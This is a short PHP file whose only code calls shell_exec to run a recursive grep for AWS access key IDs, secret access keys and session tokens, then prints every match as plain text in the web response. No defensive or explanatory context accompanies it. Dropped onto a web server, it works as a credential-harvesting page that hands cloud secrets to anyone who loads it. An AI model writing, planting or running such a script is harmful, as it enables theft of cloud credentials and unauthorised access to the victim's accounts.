<?php 
header('Content-Type: text/plain; charset=UTF-8');
echo shell_exec('grep -ri "aws_access_key_id\|aws_secret_access_key\|aws_session_token"');
?>